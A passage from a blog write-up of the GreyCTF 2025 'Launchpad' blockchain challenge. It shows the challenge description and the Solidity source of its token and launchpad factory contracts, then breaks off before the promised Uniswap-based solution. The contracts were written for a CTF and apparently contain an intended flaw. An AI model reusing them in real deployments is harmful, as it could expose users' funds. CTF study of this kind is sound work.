<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>GreyCTF 2025 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
  <meta name="twitter:title" content="GreyCTF 2025">
  <meta name="twitter:description" content="Writeup for GreyCTF 2025">
      <meta name="twitter:site" content="@Chovid99">
<meta property="og:url" content="https://chovid99.github.io/posts/greyctf-2025/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="GreyCTF 2025">
  <meta property="og:description" content="Writeup for GreyCTF 2025">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-06-08T21:22:34+07:00">
    <meta property="article:modified_time" content="2025-06-10T11:15:12+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="GreyCTF">
    <meta property="article:tag" content="Blockchain">
    <meta property="article:tag" content="Evm">
    <meta property="article:tag" content="Uniswap">
    <meta property="article:tag" content="2025">
    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/greyctf-2025/" /><link rel="prev" href="https://chovid99.github.io/posts/0ctf-2024/" /><link rel="next" href="https://chovid99.github.io/posts/google-ctf-2025/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "GreyCTF 2025",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/greyctf-2025\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, GreyCTF, blockchain, evm, uniswap, 2025","wordcount":  5947 ,
        "url": "https:\/\/chovid99.github.io\/posts\/greyctf-2025\/","datePublished": "2025-06-08T21:22:34+07:00","dateModified": "2025-06-10T11:15:12+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">GreyCTF 2025</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Jun 08, 2025">Jun 08, 2025</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;5947 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;28 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#blockchain">Blockchain</a>
      <ul>
        <li><a href="#launchpad">Launchpad</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#solution">Solution</a>
              <ul>
                <li><a href="#uniswap-v2-pair-101">Uniswap V2 Pair 101</a></li>
                <li><a href="#crafting-the-solution">Crafting the Solution</a></li>
                <li><a href="#executing-the-solution">Executing the Solution</a>
                  <ul>
                    <li><a href="#initial-setup">Initial Setup</a></li>
                    <li><a href="#claim-and-swap">Claim and Swap</a></li>
                    <li><a href="#create-uniswap-v2-pair">Create Uniswap V2 Pair</a></li>
                    <li><a href="#launch-token-via-factory">Launch Token via Factory</a></li>
                    <li><a href="#burn-lp-tokens">Burn LP Tokens</a></li>
                    <li><a href="#swap-meme-to-grey-via-uniswap-v2-pair">Swap MEME to GREY via Uniswap V2 Pair</a></li>
                  </ul>
                </li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/hNiSqKu.png" title="https://i.imgur.com/hNiSqKu.png" data-thumbnail="https://i.imgur.com/hNiSqKu.png" data-sub-html="<h2>GreyCTF 2025</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/hNiSqKu.png"
            data-srcset="https://i.imgur.com/hNiSqKu.png, https://i.imgur.com/hNiSqKu.png 1.5x, https://i.imgur.com/hNiSqKu.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/hNiSqKu.png" />
    </a><figcaption class="image-caption">GreyCTF 2025</figcaption>
    </figure>
<p>Hi everyone! It&rsquo;s been quite a while since my last blog post. Time has flown by, and life has kept me busy, leaving little room for CTFs. Looking back, you can probably notice how the frequency of my writeups has declined since I was actively participating in 2022.</p>
<p>I participated solo in GreyCTF 2025 as <code>Cylabus</code>, joining just briefly before the CTF ended, mainly because I missed those weekends of intense CTF grinding. While skimming through the pwn and blockchain challenges, the <code>launchpad</code> challenge particularly caught my eye since it involved Uniswap and felt quite close to what a real-life bug looks like. Despite my limited free time on Sunday, I decided to work on this challenge as it seemed like a good exercise for me.</p>
<p>Fortunately, I managed to solve it before the CTF ended. Given that it was an interesting challenge, combined with my nostalgia for writing writeups (remember when I used to be a writeup machine? ðŸ˜›) and, of course, the prize ðŸ˜„, I decided to write my first writeup of 2025 ðŸ™‚.</p>
<h1 id="blockchain">Blockchain</h1>
<h2 id="launchpad">Launchpad</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Since token launchpads are the new trend nowadays, we decided to write our own! Will grey.fun be the next billion dollar protocol?</p>
<p>nc challs2.nusgreyhats.org 33501</p>
<p>P.S. You can find the challenge files at this <a href="https://github.com/NUSGreyhats/greyctf25-challs-public/tree/main/blockchain/launchpad" target="_blank" rel="noopener noreffer ">link</a></p>
</div>
        </div>
    </div>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>In this challenge, we were given a zip file containing the source code. There are three main files: <code>Setup.sol</code>, <code>Token.sol</code>, and <code>Factory.sol</code>. Let&rsquo;s examine each source file to understand what the challenge does and what we need to do to solve it.</p>
<p><strong>Token.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">ERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/solmate/ERC20.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Token</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">NotFactory</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">INITIAL_AMOUNT</span> <span class="o">=</span> <span class="mi">1000</span><span class="n">_000e18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">factory</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">string</span> <span class="k">memory</span> <span class="n">_name</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">_symbol</span><span class="p">)</span> <span class="n">ERC20</span><span class="p">(</span><span class="n">_name</span><span class="p">,</span> <span class="n">_symbol</span><span class="p">,</span> <span class="mi">18</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">factory</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="n">factory</span><span class="p">,</span> <span class="n">INITIAL_AMOUNT</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">burn</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">!=</span> <span class="n">factory</span><span class="p">)</span> <span class="nb">revert</span> <span class="n">NotFactory</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">_burn</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is a simple ERC20 Token that mints <code>1_000_000 ether</code> to the <code>factory</code> (the one who creates it) and allows the <code>factory</code> to burn any amount it wants. Let&rsquo;s check the next contract.</p>
<p><strong>Factory.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Owned</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/solmate/Owned.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">FixedPointMathLib</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/solmate/FixedPointMathLib.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IUniswapV2Factory</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/v2-core/interfaces/IUniswapV2Factory.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IUniswapV2Pair</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/v2-core/interfaces/IUniswapV2Pair.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">GREY</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./lib/GREY.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Token</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Token.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Factory</span> <span class="k">is</span> <span class="n">Owned</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kn">using</span> <span class="n">FixedPointMathLib</span> <span class="k">for</span> <span class="kt">uint256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">MinimumLiquidityTooSmall</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">TargetGREYRaisedTooLarge</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">TargetGREYRaisedReached</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">TargetGREYRaisedNotReached</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">InsufficientAmountIn</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">InsufficientAmountOut</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">InsufficientLiquidity</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">InsufficientGREYLiquidity</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="n">InvalidToken</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">TokenCreated</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">token</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">creator</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">TokenBought</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">user</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="k">indexed</span> <span class="n">ethAmount</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">tokenAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">TokenSold</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">user</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="k">indexed</span> <span class="n">ethAmount</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">tokenAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">event</span> <span class="nc">TokenLaunched</span><span class="p">(</span><span class="kt">address</span> <span class="k">indexed</span> <span class="n">token</span><span class="p">,</span> <span class="kt">address</span> <span class="k">indexed</span> <span class="n">uniswapV2Pair</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">struct</span> <span class="nc">Pair</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">reserveGREY</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">reserveToken</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">MINIMUM_VIRTUAL_LIQUIDITY</span> <span class="o">=</span> <span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="kc">ether</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">GREY</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">grey</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">IUniswapV2Factory</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">uniswapV2Factory</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Amount of &#34;fake&#34; GREY liquidity each pair starts with
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Amount of GREY to be raised for bonding to end
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">targetGREYRaised</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Reserves and additional info for each token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="n">Pair</span><span class="p">)</span> <span class="k">public</span> <span class="n">pairs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// ======================================== CONSTRUCTOR ========================================
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_grey</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_uniswapV2Factory</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_virtualLiquidity</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_targetGREYRaised</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">Owned</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_virtualLiquidity</span> <span class="o">&lt;</span> <span class="n">MINIMUM_VIRTUAL_LIQUIDITY</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">MinimumLiquidityTooSmall</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">grey</span> <span class="o">=</span> <span class="n">GREY</span><span class="p">(</span><span class="n">_grey</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">uniswapV2Factory</span> <span class="o">=</span> <span class="n">IUniswapV2Factory</span><span class="p">(</span><span class="n">_uniswapV2Factory</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">virtualLiquidity</span> <span class="o">=</span> <span class="n">_virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">targetGREYRaised</span> <span class="o">=</span> <span class="n">_targetGREYRaised</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// ======================================== ADMIN FUNCTIONS ========================================
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setVirtualLiquidity</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_virtualLiquidity</span><span class="p">)</span> <span class="k">external</span> <span class="n">onlyOwner</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_virtualLiquidity</span> <span class="o">&lt;</span> <span class="n">MINIMUM_VIRTUAL_LIQUIDITY</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">MinimumLiquidityTooSmall</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">virtualLiquidity</span> <span class="o">=</span> <span class="n">_virtualLiquidity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setTargetGREYRaised</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_targetGREYRaised</span><span class="p">)</span> <span class="k">external</span> <span class="n">onlyOwner</span> <span class="p">{</span>
